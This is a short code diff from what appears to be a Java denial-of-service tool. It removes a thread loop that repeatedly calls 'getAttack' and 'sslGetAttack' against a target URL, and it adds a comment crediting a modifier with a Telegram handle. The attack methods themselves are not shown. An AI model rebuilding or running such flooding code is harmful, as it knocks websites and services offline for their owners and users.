@@ -321,23 +321,6 @@ public void run() {
         con.disconnect();
     }
 
-    @Override
-    public void run() {
-        try {
-            while (true) {
-                switch (this.type) {
-                    case 3:
-                        getAttack(Dos.url);
-                        break;
-                    case 4:
-                        sslGetAttack(Dos.url);
-                        break;
-                }
-            }
-        } catch (IOException e) {
-            System.out.println(RED + "IO Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
-        } catch (Exception e) {
-            System.out.println(RED + "Error in thread: " + this.seq + " - " + e.getMessage() + RESET);
-        }
-    }
-}
+
+//This is a modified by BoyFromBD.
+// t.me/heartcrafter
